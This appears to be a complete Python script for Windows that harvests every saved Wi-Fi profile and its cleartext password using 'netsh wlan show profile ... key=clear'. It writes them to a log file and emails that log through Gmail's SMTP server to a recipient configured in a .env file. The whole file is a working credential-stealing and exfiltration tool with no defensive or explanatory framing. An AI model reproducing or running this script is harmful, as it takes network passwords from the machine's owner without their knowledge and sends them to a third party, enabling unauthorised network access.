import subprocess
import logging
import smtplib
import os
from dotenv import load_dotenv
load_dotenv()

# Access credentials from .env
toEmail = os.getenv("TO_EMAIL")
fromEmail = os.getenv("FROM_EMAIL")
key = os.getenv("KEY")

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('temp.log')
fh.setLevel(logging.DEBUG)
logger.addHandler(fh)

a = subprocess.check_output(
    ['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]

for i in a:
    results = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        logger.info("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
        logger.info("{:<30}|  {:<}".format(i, ""))


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, toEmail, message)
    server.quit()


with open('temp.log', 'r') as file:
    data = file.read()

send_mail(fromEmail, key, data)
